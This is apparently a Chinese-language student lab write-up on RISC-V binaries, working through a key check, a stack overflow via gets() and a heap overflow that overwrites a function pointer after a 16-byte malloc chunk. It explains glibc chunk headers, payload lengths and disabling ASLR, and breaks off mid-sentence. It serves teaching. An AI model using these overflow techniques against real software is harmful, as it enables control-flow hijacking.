\u6211\u4eec\u7ed9\u51fa\u4e86 bonus \u7684 ELF\uff0c\u8fd9\u662f\u4e00\u4e2a\u5b58\u5728 heap overflow \u6f0f\u6d1e\u7684\u7a0b\u5e8f\u3002 \u8bf7\u627e\u51fa ELF \u4e2d\u7684\u6f0f\u6d1e\u3002\u53ef\u4ee5\u5229\u7528 riscv32-unknown-linux-gnu-objdump \u67e5\u770b ELF \u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\u5e76\u8fdb\u884c\u9006\u5411\uff0c\u6216\u4f7f\u7528 QEMU+GDB \u6216 SPIKE \u8fdb\u884c\u52a8\u6001\u8c03\u8bd5\u3002 \u6211\u4eec\u63d0\u4f9b\u7684 ELF \u4f1a\u8ba9\u4f60\u8f93\u5165\u4e24\u884c\u6570\u636e\u3002\u5176\u4e2d\u7b2c\u4e00\u884c\u6570\u636e\u5fc5\u987b\u662f\u4f60\u7684\u5b66\u53f7\uff1b\u800c\u7b2c\u4e8c\u884c\u6570\u636e\u662f\u8fdb\u884c overflow \u7684 payload\u3002 \u6211\u4eec\u5e0c\u671b\u4f60\u80fd\u5c06 ELF \u7684\u63a7\u5236\u6d41\u52ab\u6301\u5230 target_xxx \u7684\u51fd\u6570\uff0c\u5176\u4e2d xxx \u4e3a\u4f60\u7684\u5b66\u53f7\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f60\u9700\u8981\u901a\u8fc7\u8f93\u5165\u7279\u5b9a\u7684 payload \u6765\uff0c\u6765\u8ba9 ELF \u6267\u884c\u5176\u672c\u4e0d\u5e94\u8be5\u6267\u884c\u7684\u51fd\u6570\u3002\u5982\u679c\u4f60\u5b8c\u6210\u4e86\u8fd9\u4e00\u6b65\uff0c\u4f60\u5c06\u770b\u5230 ELF \u8f93\u51fa\u63d0\u793a\u201dCongratulation xxx! You successfully perform a heap overflow attack!\u201d\u3002\u4f46\u4f60\u6b64\u65f6\u53ef\u80fd\u4f1a\u53d1\u73b0\u7a0b\u5e8f\u65e0\u6cd5\u6b63\u5e38\u9000\u51fa\uff0c\u4f1a\u62a5segment fault \u6216\u662f\u5176\u4ed6\u9519\u8bef\u3002\u5982\u679c\u62a5\u9519\u4e86\uff0c\u8bf7\u601d\u8003\u5e76\u89e3\u91ca\u4e3a\u4ec0\u4e48\u4f1a\u51fa\u73b0\u8fd9\u4e9b\u9519\u8bef\u3002 \u6700\u540e\uff0c\u5982\u679c\u5b8c\u6210\u4e0a\u4e00\u6b65\u540e\uff0c\u7a0b\u5e8f\u65e0\u6cd5\u6b63\u5e38\u9000\u51fa\uff08\u5373\u6709\u62a5\u9519\uff09\uff0c\u8bf7\u4fee\u6539\u4f60\u7684 payload\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u5728\u6ca1\u6709\u62a5\u9519\u7684\u60c5\u51b5\u4e0b\u6b63\u5e38\u9000\u51fa\u3002 \u7406\u89e3 ELF \u6587\u4ef6\u548c\u6c47\u7f16\u6587\u4ef6 \u00b6 \u4ee3\u7801\u6bb5 .text \u5b58\u50a8\u4e86 riscv \u5b57\u8282\u7801\uff0c\u53ea\u8bfb\u6570\u636e\u6bb5 .rodata \u5728 .text \u540e\uff0c\u5b58\u50a8\u4e86\u53ea\u8bfb\u7684\u6570\u636e\uff08\u6bd4\u5982\u5b57\u7b26\u4e32\uff09\uff0c\u901a\u8fc7 riscv32-unknow-linux-gnu-objdump -d key \u53ef\u4ee5\u53cd\u7f16\u8bd1\u51fa plt \u8868\u548c .text \u6bb5\uff0c\u901a\u8fc7 ...-objdump -j .rodata -d key \u53ef\u4ee5\u8f93\u51fa .rodata \u6bb5\uff0c\u901a\u8fc7\u5c06\u5176\u5185\u5bb9\u7684\u5341\u516d\u8fdb\u5236\u503c\u8f6c\u4e3a ascii \u5b57\u7b26\u53ef\u4ee5\u5f97\u5230\u5b57\u7b26\u4e32\u5e38\u91cf\u7684\u5185\u5bb9\u548c\u5bf9\u5e94\u5730\u5740 \u7834\u89e3 key \u00b6 \u9996\u5148\u53cd\u7f16\u8bd1\u51fa .text \u6bb5\uff0c\u53d1\u73b0\u5176\u4e2d main \u51fd\u6570\u90e8\u5206\u5c31\u662f\u4f9d\u6b21\u8c03\u7528\u4e86 read_student \u548c read_key \u51fd\u6570\uff0c\u6240\u4ee5\u9700\u8981\u770b\u8fd9\u4e24\u4e2a\u51fd\u6570\u7684\u6c47\u7f16\u4ee3\u7801 \u901a\u8fc7\u5206\u6790\u5f97\u5230\u4e24\u4e2a\u51fd\u6570\u7684\u5e27\u6808\u5e03\u5c40\uff1a read_student \u51fd\u6570\u6709\u4e00\u884c\uff1a 104a6: 35e9 jal 10370 <exit@plt> \u4e0d\u96be\u770b\u51fa\u5b83\u524d\u9762\u8bfb\u53d6\u4e86\u5b66\u53f7\u5230\u5c40\u90e8\u53d8\u91cf s0-40 \u4e2d\uff0c\u7136\u540e\u5224\u65ad\u662f\u5426\u90fd\u662f\u6570\u5b57\uff0c\u5982\u679c\u4e0d\u662f\u5219\u4f1a\u6267\u884c\u8fd9\u4e00\u53e5 exit\uff0c\u800c\u540e\u662f\u4e00\u6bb5\u5faa\u73af 104bc: fe042423 sw zero,-24(s0) 104c0: a035 j 104ec <read_student+0x94> 104c2: fe842783 lw a5,-24(s0) 104c6: 17c1 addi a5,a5,-16 104c8: 97a2 add a5,a5,s0 104ca: fe87c783 lbu a5,-24(a5) 104ce: fd078713 addi a4,a5,-48 104d2: 67c9 lui a5,0x12 104d4: 02878693 addi a3,a5,40 # 12028 <number> 104d8: fe842783 lw a5,-24(s0) 104dc: 078a slli a5,a5,0x2 104de: 97b6 add a5,a5,a3 104e0: c398 sw a4,0(a5) 104e2: fe842783 lw a5,-24(s0) 104e6: 0785 addi a5,a5,1 104e8: fef42423 sw a5,-24(s0) 104ec: fe842703 lw a4,-24(s0) 104f0: 4791 li a5,4 104f2: fce7d8e3 bge a5,a4,104c2 <read_student+0x6a> \u9605\u8bfb\u53d1\u73b0\u5faa\u73af\u53d8\u91cf -24(s0) \u4ece 0 \u5faa\u73af\u5230 4\uff0c\u6bcf\u6b21\u53d6\u51fa\u8f93\u5165\u4e2d\u7684\u5b57\u7b26 input[i] \u7136\u540e\u51cf\u53bb '0'(48)\uff080x104ce \u884c\uff09\u5b58\u5165\u5168\u5c40\u53d8\u91cf number[i]\uff08\u5728 .data \u6bb5\u4e2d\uff09\u3002\u56e0\u4e3a\u5b66\u53f7\u524d\u4e94\u4f4d\u662f 32101\uff0c\u6240\u4ee5\u5bf9\u5e94 number[0:5] \u4e5f\u5c31\u662f [3, 2, 1, 0, 1] \u540e\u9762\u53c8\u662f\u7c7b\u4f3c\u7684\u5faa\u73af\uff0c\u5faa\u73af\u53d8\u91cf -28(s0) \u4ece 5 \u5faa\u73af\u5230 9\uff0c\u6bcf\u6b21\u53d6\u51fa input[i] \u5e76\u7528 '9'(57) \u51cf\u53bb\u5b83\u5b58\u5165 number[i]\u3002\u56e0\u4e3a\u5b66\u53f7\u540e\u4e94\u4f4d\u662f <\u9690\u79c1\u55b5>\uff0c\u6240\u4ee5\u5bf9\u5e94 number[5:10] \u4e5f\u5c31\u662f <\u9690\u79c1\u55b5> \u518d\u770b read_key \u51fd\u6570\uff0c\u5b83\u5c06 -20(s0) \u8d4b\u503c\u4e3a\u4e86 0\uff0c\u7136\u540e\u8bfb\u5165\u4e86\u4e00\u4e2a\u6570\u5b57\u5230 s0-32 \u4e2d\uff0c\u4e4b\u540e\u662f\u4e00\u6bb5\u5faa\u73af 10562: fe042423 sw zero,-24(s0) 10566: a01d j 1058c <read_key+0x4a> 10568: 67c9 lui a5,0x12 1056a: 02878713 addi a4,a5,40 # 12028 <number> 1056e: fe842783 lw a5,-24(s0) 10572: 078a slli a5,a5,0x2 10574: 97ba add a5,a5,a4 10576: 439c lw a5,0(a5) 10578: fec42703 lw a4,-20(s0) 1057c: 97ba add a5,a5,a4 1057e: fef42623 sw a5,-20(s0) 10582: fe842783 lw a5,-24(s0) 10586: 0785 addi a5,a5,1 10588: fef42423 sw a5,-24(s0) 1058c: fe842703 lw a4,-24(s0) 10590: 47a5 li a5,9 10592: fce7dbe3 bge a5,a4,10568 <read_key+0x26> 10596: fe042783 lw a5,-32(s0) 1059a: fec42703 lw a4,-20(s0) 1059e: 00f71863 bne a4,a5,105ae <read_key+0x6c> \u5faa\u73af\u53d8\u91cf -24(s0) \u4ece 0 \u5230 9\uff0c\u5faa\u73af\u4f53\u4e2d\u4e00\u6b21\u6b21\u53d6\u51fa number[i] \u5e76\u7d2f\u52a0\u5230 -20(s0) \u4e2d\uff0c\u6700\u540e\u5c06 -32(s0) \u5373\u8f93\u5165\u4e0e\u5f97\u5230\u7684\u7ed3\u679c -20(s0) \u76f8\u6bd4\u8f83\uff0c\u5224\u65ad\u662f\u5426\u76f8\u7b49\uff0c\u6240\u4ee5\u8981\u8f93\u5165\u7684 key \u4e5f\u5c31\u662f number \u6570\u7ec4\u7684\u548c\uff0c\u5f97\u5230 3+2+1+0+1+<\u9690\u79c1\u55b5> = ? \u4e5f\u5c31\u662f\u6211\u7684\u5b66\u53f7\u5bf9\u5e94\u7684 key\uff0c\u586b\u8fdb\u53bb\u7b54\u6848\u6b63\u786e Buffer Overflow \u00b6 bof.c \u6587\u4ef6\u4e2d\u7684 hear \u51fd\u6570\u56e0\u4e3a\u4f7f\u7528 gets \u51fd\u6570\u5bfc\u81f4\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e int hear ( unsigned int stu_id ){ char p1 = 'N' ; char p2 = 'Y' ; char str [ LENGTH ]; gets ( str ); if ( p1 == p2 ) { printf ( \"Wow [%u] you successfully overflow me! \\n \" , stu_id ); return 1 ; } else { printf ( \"[%u], you can`t hack me,please try again! \\n \" , stu_id ); return 0 ; } } \u5f88\u663e\u7136\uff0c\u76ee\u6807\u662f\u901a\u8fc7\u8f93\u5165 str \u5229\u7528\u7f13\u51b2\u533a\u6ea2\u51fa\u6765\u4fee\u6539\u5c40\u90e8\u53d8\u91cf p1\u3001p2\uff0c\u4f7f\u5176\u76f8\u7b49 \u7f16\u8bd1\u4e0e\u53cd\u7f16\u8bd1 \u00b6 \u4f7f\u7528 riscv32-unknown-linux-gnu-gcc bof.c -o bof \u6765\u8fdb\u884c\u7f16\u8bd1 \u518d\u901a\u8fc7 riscv32-unknown-linux-gnu-objdump -d bof > bof.s \u6765\u53cd\u7f16\u8bd1\u3001\u91cd\u5b9a\u5411\u5f97\u5230\u6c47\u7f16\u6587\u4ef6 \u901a\u8fc7\u6c47\u7f16\u4ee3\u7801\u5206\u6790\u5e27\u6808 \u00b6 \u4e3b\u8981\u5173\u6ce8 hear \u51fd\u6570\u7684\u6c47\u7f16\u4ee3\u7801 000104e8 <hear>: 104e8: 7179 addi sp,sp,-48 104ea: d606 sw ra,44(sp) 104ec: d422 sw s0,40(sp) 104ee: 1800 addi s0,sp,48 104f0: fca42e23 sw a0,-36(s0) 104f4: 04e00793 li a5,78 104f8: fef407a3 sb a5,-17(s0) 104fc: 05900793 li a5,89 10500: fef40723 sb a5,-18(s0) 10504: fe440793 addi a5,s0,-28 10508: 853e mv a0,a5 1050a: 3ddd jal 10400 <gets@plt> 1050c: fef44703 lbu a4,-17(s0) 10510: fee44783 lbu a5,-18(s0) 10514: 00f71a63 bne a4,a5,10528 <hear+0x40> 10518: fdc42583 lw a1,-36(s0) 1051c: 67c1 lui a5,0x10 1051e: 61878513 addi a0,a5,1560 # 10618 10522: 3dfd jal 10420 <printf@plt> 10524: 4785 li a5,1 10526: a801 j 10536 <hear+0x4e> 10528: fdc42583 lw a1,-36(s0) 1052c: 67c1 lui a5,0x10 1052e: 64078513 addi a0,a5,1600 # 10640 10532: 35fd jal 10420 <printf@plt> 10534: 4781 li a5,0 10536: 853e mv a0,a5 10538: 50b2 lw ra,44(sp) 1053a: 5422 lw s0,40(sp) 1053c: 6145 addi sp,sp,48 1053e: 8082 ret \u9996\u5148\u901a\u8fc7 addi sp,sp,-48 \u5f00\u8f9f\u4e86 hear \u7684\u51fd\u6570\u6808\u7a7a\u95f4\uff0c\u7136\u540e\u5b58\u5165 ra \u4e0e s0\uff08\u8fd4\u56de\u5730\u5740\u4e0e\u524d\u5e27\u6307\u9488\uff09\uff0c\u518d\u8d4b\u503c\u4e86\u5e27\u6307\u9488 s0\uff0c\u5c06\u53c2\u6570 a0\uff08stu_id\uff0c32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff09\u5b58\u5165 -36(s0)\uff0c\u5c06 \"N\"(78) \u653e\u5165 -17(s0)\u3001\"Y\"(89) \u653e\u5165 -18(s0)\u3002\u7136\u540e\u5c06 s0-28 \u8d4b\u503c\u7ed9 a5 \u548c a0\uff0c\u5e76\u8c03\u7528 gets \u51fd\u6570\uff0c\u4e5f\u5c31\u8bf4\u660e\u4ece s0-28 \u5f00\u59cb\u7684 10 \u4e2a\u5b57\u8282\u7a7a\u95f4\u662f str\u3002\u6700\u540e\u53d6\u51fa -17(s0) -18(s0) \u5e76\u6bd4\u8f83\uff0c\u7136\u540e\u662f\u4e00\u7cfb\u5217\u63a7\u5236\u8f93\u51fa\u7684\u64cd\u4f5c\u3002\u6700\u540e\u53d6\u51fa\u5b58\u4e0b\u7684 ra \u548c s0\uff0c\u518d\u6e05\u9664\u6808\u7a7a\u95f4\uff0c\u7136\u540e\u8fd4\u56de\u3002 \u6240\u4ee5\u8fd9\u4e2a\u51fd\u6570\u5e27\u6808\u7684\u5e03\u5c40\u5982\u4e0b\uff1a \u6784\u9020 payload \u00b6 gets \u51fd\u6570\u5e76\u4e0d\u4f1a\u68c0\u67e5\u8f93\u5165\u957f\u5ea6\uff0c\u800c\u4e14\u8f93\u5165\u662f\u4ece\u5c0f\u5730\u5740\u5411\u5927\u5730\u5740\u6269\u5c55\uff0c\u56e0\u4e3a str \u4e0e p1 p2 \u90fd\u662f\u8fde\u7740\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u8f93\u5165 12 \u4e2a\u5b57\u7b26\uff0c\u5e76\u4e14\u6700\u540e\u4e24\u4e2a\u5b57\u7b26\u76f8\u540c\u5219\u4f1a\u66f4\u6539 p1 p2 \u4f7f\u5176\u76f8\u7b49\u3002\uff08\u6ce8\u610f\u8fd9\u91cc\u4e0d\u80fd\u8f93\u5165 10 \u4e2a\u4efb\u610f\u5b57\u7b26\u52a0\u4e00\u4e2a \"N\"\uff0c\u56e0\u4e3a gets \u4e00\u4e2a\u5b57\u7b26\u4e32\u4f1a\u5728\u7ed3\u5c3e\u52a0\u4e0a \"\\0\" \u4e5f\u5c31\u662f 0\uff0c\u6539\u53d8 p1 \u53d8\u6210\u4e86 0\uff0c\u4e0d\u4f1a\u518d\u7b49\u4e8e \"N\"\uff09 \u6210\u529f\u6ea2\u51fa\u4f46\u6bb5\u9519\u8bef \u00b6 \u5982\u679c str \u6ea2\u51fa\u7684\u8fc7\u591a\u5bfc\u81f4\u6539\u53d8\u4e86\u524d\u5e27\u6307\u9488\uff08s0-8\uff09\u6216\u8fd4\u56de\u5730\u5740\uff08s0-4\uff09\u5c31\u53ef\u80fd\u4f1a\u5bfc\u81f4\u540e\u7eed\u7684\u64cd\u4f5c\u4e2d\u56e0\u4e3a\u524d\u5e27\u6307\u9488\u6539\u53d8\u5bfc\u81f4\u6808\u6307\u9488\u4f4d\u7f6e\u9519\u8bef\u6216\u8fd4\u56de\u4e0d\u6210\u529f\uff0c\u51fa\u73b0\u6bb5\u9519\u8bef\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8db3\u591f\u591a\u4efb\u610f\u5b57\u7b26\uff08\u4fdd\u8bc1 p1 p2 \u76f8\u7b49\uff09\u5c31\u53ef\u4ee5\u8fbe\u5230\u6210\u529f\u6ea2\u51fa\u4f46\u662f\u6bb5\u9519\u8bef\u7684\u7ed3\u679c\uff1a Bonus: Heap Overflow \u00b6 \u53cd\u7f16\u8bd1\u5206\u6790\u6c47\u7f16\u4ee3\u7801 \u00b6 objdump \u53cd\u7f16\u8bd1\u540e\u53d1\u73b0\u6709\u5f88\u591a target_ \u51fd\u6570\uff0c\u627e\u5230\u6211\u7684\u5b66\u53f7 <\u9690\u79c1\u55b5> \u5bf9\u5e94\u7684\u5730\u5740 0x00010ddc\u3002\u4e5f\u770b\u5230\u4e86 say_goodbye \u548c repeat_words \u4ee5\u53ca main \u51fd\u6570\u3002\u4e0b\u9762\u4e3b\u8981\u5206\u6790 main \u51fd\u6570\u53ca\u5176\u5bf9\u5e94\u5e27\u6808\uff1a malloc \u90e8\u5206 \u00b6 1100c: 4541 li a0,16 1100e: be2ff0ef jal ra,103f0 <malloc@plt> 11012: 87aa mv a5,a0 11014: fef42623 sw a5,-20(s0) 11018: 4521 li a0,8 1101a: bd6ff0ef jal ra,103f0 <malloc@plt> 1101e: 87aa mv a5,a0 11020: fef42423 sw a5,-24(s0) 11024: fe842783 lw a5,-24(s0) 11028: 6745 lui a4,0x11 1102a: fe070713 addi a4,a4,-32 # 10fe0 <repeat_words> 1102e: c398 sw a4,0(a5) 11030: fe842783 lw a5,-24(s0) 11034: 6745 lui a4,0x11 11036: fbc70713 addi a4,a4,-68 # 10fbc <say_goodbye> 1103a: c3d8 sw a4,4(a5) \u5148\u901a\u8fc7 malloc \u7533\u8bf7 16 \u5b57\u8282\u5927\u5c0f\u7684\u5806\u7a7a\u95f4\uff0c\u5c06\u5730\u5740\u653e\u5165 -20(s0)\uff0c\u518d\u901a\u8fc7 malloc \u7533\u8bf7 8 \u5b57\u8282\u5927\u5c0f\u7684\u5806\u7a7a\u95f4\uff0c\u653e\u5165 -24(s0)\u3002\u7136\u540e\u5c06 repeat_words \u51fd\u6570\u548c say_goodbye \u51fd\u6570\u7684\u5730\u5740\u5206\u522b\u653e\u5165\u540e\u4e00\u4e2a\u5806\u7a7a\u95f4\u7684\u524d 4 \u5b57\u8282\u548c\u540e 4 \u5b57\u8282\u4e2d\u3002 \u4e2d\u95f4\u8bfb\u5165\u5b66\u53f7\u548c\u8f93\u51fa\u63d0\u793a\u7b26\u7684\u90e8\u5206\u4e0d\u591a\u5206\u6790 \u8f93\u5165\u4e0e\u8c03\u7528\u51fd\u6570\u90e8\u5206 \u00b6 1106c: 8381a783 lw a5,-1992(gp) # 14038 <stdin@GLIBC_2.29> 11070: 863e mv a2,a5 11072: 03200593 li a1,50 11076: fec42503 lw a0,-20(s0) 1107a: ba6ff0ef jal ra,10420 <fgets@plt> 1107e: fe842783 lw a5,-24(s0) 11082: 439c lw a5,0(a5) 11084: fec42503 lw a0,-20(s0) 11088: 9782 jalr a5 1108a: fe842783 lw a5,-24(s0) 1108e: 43d8 lw a4,4(a5) 11090: 84018513 addi a0,gp,-1984 # 14040 <id_str> 11094: 9702 jalr a4 \u5148\u901a\u8fc7 fgets \u51fd\u6570\u8bfb\u53d6\u81f3\u591a 50 \u4e2a\u5b57\u8282\u7684\u5185\u5bb9\u5230 -20(s0)\uff08\u7b2c\u4e00\u4e2a\u5806\u7a7a\u95f4\uff09\u4e2d\u3002\u7136\u540e\u53d6\u51fa -20(s0) \u7684\u5185\u5bb9\u4f5c\u4e3a\u53c2\u6570\u95f4\u63a5\u8c03\u7528 -24(s0) \u7684\u524d 4 \u5b57\u8282\u4f4d\u7f6e\u7684\u51fd\u6570\u3002\u518d\u53d6\u51fa id_str\uff08\u5b58\u5728\u5168\u5c40\u53d8\u91cf\u4e2d\u7684\u5b66\u53f7\uff09\u4f5c\u4e3a\u53c2\u6570\u95f4\u63a5\u8c03\u7528\u7b2c\u4e8c\u4e2a\u5806\u7a7a\u95f4\u7684\u540e 4 \u5b57\u8282\u4f4d\u7f6e\u7684\u51fd\u6570\u3002 \u6700\u540e free \u4e24\u4e2a\u5806\u7a7a\u95f4\u5e76 exit\u3002\u6700\u7ec8\u6574\u4e2a\u51fd\u6570\u7684\u5e27\u6808\u548c\u8c03\u7528\u6d41\u7a0b\u5982\u4e0b\u56fe\uff1a \u6f0f\u6d1e\u5206\u6790 \u00b6 \u5f88\u660e\u663e\uff0cfgets \u8bfb\u53d6\u81f3\u591a 50 \u5b57\u8282\u7684\u5185\u5bb9\u5230\u7b2c\u4e00\u4e2a\u5806\u7a7a\u95f4\uff0c\u4f46\u662f\u8be5\u5806\u7a7a\u95f4\u53ea\u7533\u8bf7\u4e86 16 \u5b57\u8282\u7684\u5927\u5c0f\uff0c\u56e0\u6b64\u53ef\u80fd\u4f1a\u9020\u6210\u5806\u6ea2\u51fa\u3002\u5e76\u4e14\u8fd9\u4e2a\u5806\u7a7a\u95f4\u662f\u5148\u7533\u8bf7\u7684\uff0c\u4e0b\u4e00\u4e2a\u5b58\u6709\u51fd\u6570\u5730\u5740\u7684\u5806\u7a7a\u95f4\u6b63\u597d\u5728\u5176\u4e0b\u65b9\uff08\u5927\u5730\u5740\u65b9\u5411\uff09\uff0c\u6240\u4ee5 fgets \u6ea2\u51fa\u7684\u8f93\u5165\u53ef\u4ee5\u76f4\u63a5\u8986\u76d6\u7b2c\u4e8c\u4e2a\u5806\u7a7a\u95f4\u7684\u5185\u5bb9\uff0c\u4f7f\u5f97\u5176\u4e2d\u5b58\u7684\u5730\u5740\u53d1\u751f\u6539\u53d8\uff0c\u8fdb\u800c\u52ab\u6301\u63a7\u5236\u6d41\u5230 target \u51fd\u6570\u3002 \u6f0f\u6d1e\u5229\u7528 \u00b6 \u867d\u7136\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165\u6765\u6ea2\u51fa\u8986\u76d6\u7b2c\u4e8c\u4e2a\u5806\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u7531\u4e8e\u5806\u7684\u7ed3\u6784\u4e0d\u50cf\u6808\u4e00\u6837\u53ea\u4fdd\u5b58\u6570\u636e\uff0c\u5b83\u8fd8\u6709 header \u4fe1\u606f\uff0c\u5982\u679c\u76f4\u63a5\u8986\u76d6\u7684\u8bdd\u4f1a\u7834\u574f\u6389 header \u4f7f\u7a0b\u5e8f\u51fa\u73b0\u5f02\u5e38\u3002\u56e0\u6b64\u8fd8\u9700\u8981\u4e86\u89e3\u5806\u7684\u7ed3\u6784 glibc \u5806\u7ed3\u6784 \u00b6 glibc \u5806\u7531\u4e00\u4e2a\u4e2a\u5806\u5757\u7ec4\u6210\uff0c\u4f7f\u7528 malloc \u53ef\u4ee5\u5728\u5f53\u524d\u5806\u5757\u4e0b\u65b9\uff08\u5927\u5730\u5740\uff09\u7533\u8bf7\u4e00\u4e2a\u65b0\u7684\u5806\u5757\uff0c\u5806\u5757\u5305\u542b header \u548c data \u4e24\u90e8\u5206\uff0c\u800c malloc \u8fd4\u56de\u7684\u6307\u9488\u6307\u5411\u7684\u662f data \u90e8\u5206\u7684\u9996\u5b57\u8282\uff0c\u5176\u5305\u542b\u81f3\u5c11\u7533\u8bf7\u7684\u5927\u5c0f\u7684\u7a7a\u95f4\u3002header \u7531\u4ee5\u4e0b\u51e0\u90e8\u5206\u7ec4\u6210\uff1a prev_size: 32 \u4f4d\u7a0b\u5e8f\u4e2d\u662f 4 \u5b57\u8282\uff0c\u5982\u679c\u5f53\u524d\u7684\u4e0a\u4e00\u4e2a\u5806\u5757\uff08\u5c0f\u5730\u5740\u65b9\u5411\uff09\u6b63\u5728\u4f7f\u7528\uff0c\u5219 prev_size \u53ef\u4ee5\u4f5c\u4e3a\u4e0a\u4e00\u4e2a\u5806\u5757\u7684\u4e00\u90e8\u5206\uff0c\u5b58\u50a8\u6570\u636e\u3002\u5982\u679c\u4e0a\u4e00\u4e2a\u5806\u5757\u5df2\u7ecf\u88ab free \u4e86\uff0c\u5219 prev_size \u8868\u793a\u4e0a\u4e00\u4e2a\u5806\u5757\u7684\u5927\u5c0f size: 32 \u4f4d\u7a0b\u5e8f\u4e2d\u662f 4 \u5b57\u8282\uff0c\u8868\u793a\u6574\u4e2a\u5806\u5757\uff08\u5305\u542b header\uff09\u7684\u5927\u5c0f\uff0c\u5927\u5c0f\u4e00\u5b9a\u662f 8 \u7684\u500d\u6570\uff08\u4e0d\u7136\u6269\u5230 8 \u7684\u500d\u6570\uff09\u56e0\u4e3a\u5927\u5c0f\u4e00\u5b9a\u662f 8 \u7684\u500d\u6570\uff0c\u6240\u4ee5\u6700\u540e\u4e09\u4e2a\u6bd4\u7279\u4f4d\u53ef\u4ee5\u4e0d\u4e0e\u5927\u5c0f\u6709\u5173\uff08\u8bfb\u53d6\u5927\u5c0f\u65f6\u76f4\u63a5\u5c06\u540e\u4e09\u4e2a\u6bd4\u7279\u8bbe\u4e3a 0\uff09\uff0c\u56e0\u6b64\u5b83\u4eec\u4ece\u9ad8\u5230\u4f4e\u8868\u793a\u4ee5\u4e0b\u4e09\u4e2a\u6807\u5fd7\uff1a NON_MAIN_ARENA: \u5f53\u524d\u5806\u5757\u662f\u5426\u4e0d\u5c5e\u4e8e\u4e3b\u7ebf\u7a0b\uff0c1 \u4e0d\u5c5e\u4e8e\uff0c0 \u5c5e\u4e8e IS_MAPPED: \u5f53\u524d\u5806\u5757\u662f\u5426\u662f\u7531 mmap \u5206\u914d\u7684\uff08\u5982\u679c\u7533\u8bf7\u7a7a\u95f4\u8fc7\u5927\u5219\u7531 mmap \u5206\u914d\uff09 PREV_INUSE: \u524d\u4e00\u4e2a\u5806\u5757\u662f\u5426\u88ab\u4f7f\u7528\uff0c\u7b2c\u4e00\u4e2a\u88ab\u5206\u914d\u7684\u5806\u5757\u8fd9\u91cc\u662f 1\uff0c\u540e\u9762\u7684\u5982\u679c\u524d\u4e00\u5806\u5757\u6b63\u5728\u4f7f\u7528\u5219\u662f 1\u3001\u88ab free \u4e86\u5219\u662f 0 user data: \u6570\u636e\u90e8\u5206\uff08\u5982\u679c\u5f53\u524d\u5806\u5757\u88ab free \u4e86\u5219\u4f1a\u4fdd\u5b58 fd bk fd_nextsize bk_nextsize \u4fe1\u606f\uff09 \u5982\u679c\u6ca1\u6709\u5f00\u542f ASLR\uff08\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\uff09\u5219\u4e24\u4e2a\u5806\u5757\u662f\u7d27\u6328\u7740\u7684\uff0c\u5982\u679c\u5f00\u542f\u4e86 ASLR \u5219\u4e24\u4e2a\u5806\u5757\u4e2d\u95f4\u6709\u968f\u673a\u5927\u5c0f\u7684\u95f4\u9694\u3002ASLR \u5728 Linux \u4e0a\u901a\u8fc7 echo 0 > /proc/sys/kernel/randomize_va_space \u6765\u5173\u95ed\uff08\u5728\u505a\u8fd9\u9898\u7684\u65f6\u5019\u9700\u8981\u5173\u95ed\uff09 \u5e76\u4e14\u6bcf\u4e2a\u5806\u5757\u4f1a\u5bf9\u9f50\u5230 0x10(16) \u7684\u6574\u6570\u500d\u5b57\u8282\uff0c\u5c11\u7684\u8bdd\u5219\u5728 user data \u540e\u9762\u8865\u5145\uff0c\u8fd9\u4e2a\u4e5f\u4f1a\u5f71\u54cd\u5230 size \u5206\u6790\u9898\u4e2d\u7684\u5806 \u00b6 \u9898\u76ee\u7533\u8bf7\u4e86\u4e24\u4e2a\u5806\u5757\uff0c\u4e00\u4e2a\u662f 16 \u5b57\u8282\u5927\u5c0f\uff0c\u53e6\u4e00\u4e2a 8 \u5b57\u8282\u5927\u5c0f\uff0c\u5b83\u4eec\u7684 prev_size \u90fd\u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u53ef\u4ee5\u88ab\u586b\u5165\u4efb\u610f\u5185\u5bb9 16 \u5b57\u8282\u5927\u5c0f\u7684\u5806\u5757\u52a0\u4e0a 8 \u5b57\u8282\u7684 prev_size \u548c size \u540e\u53d8\u6210 24 \u5b57\u8282\uff0c\u5bf9\u9f50\u5230 16 \u7684\u500d\u6570\u4e3a 32 \u5b57\u8282\uff0cNON_MAIN_ARENA \u4e3a 0\uff0cIS_MAPPED \u4e3a 0\uff0cPREV_INUSE \u4e3a 1\uff0c\u6240\u4ee5 size \u90e8\u5206\u4e3a 0b100001(0x21) 8 \u5b57\u8282\u5927\u5c0f\u7684\u5806\u5757\u52a0\u4e0a 8 \u5b57\u8282 prev_size \u548c size \u540e\u53d8\u6210 16 \u5b57\u8282\uff0c\u6b63\u597d\u4e3a 16 \u6574\u6570\u500d\uff0c\u4e09\u4e2a\u6807\u5fd7\u540c\u6837\u4e3a 001\uff0c\u6240\u4ee5 size \u4e3a 0b10001(0x11) \u56e0\u6b64\u7b2c\u4e00\u4e2a\u5806\u5757\u7684 header \u4e0b\u6709 28 \u5b57\u8282\u7684\u7a7a\u95f4\uff0c\u7b2c\u4e8c\u4e2a\u5806\u5757\u7684 header \u4e0b\u6709 8 \u5b57\u8282\u7a7a\u95f4\uff0c\u4e14\u5df2\u7ecf\u586b\u5165\u4e24\u4e2a\u51fd\u6570\u5730\u5740 \u6784\u9020 payload \u00b6 \u56e0\u4e3a prev_size \u662f\u7a7a\u95f2\u72b6\u6001\u53ef\u4ee5\u968f\u610f\u4f7f\u7528\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u5728\u6ea2\u51fa\u65f6\u7ed5\u8fc7\u7b2c\u4e8c\u4e2a\u5806\u5757\u7684 size \u5c31\u597d\u4e86\uff0c\u6574\u4e2a\u5806\u7684\u7ed3\u6784\u548c\u5229\u7528\u65b9\u5f0f\u5982\u4e0b\uff1a \u5373\u5148\u4f7f\u7528 28 \u4e2a\u4efb\u610f\u5b57\u7b26\u5360\u6ee1\u7b2c\u4e00\u4e2a\u5806\u7684 data \u548c\u7b2c\u4e8c\u4e2a\u5806\u7684 prev_size\uff0c\u518d\u8865\u4e0a\u7b2c\u4e8c\u4e2a\u5806\u7684 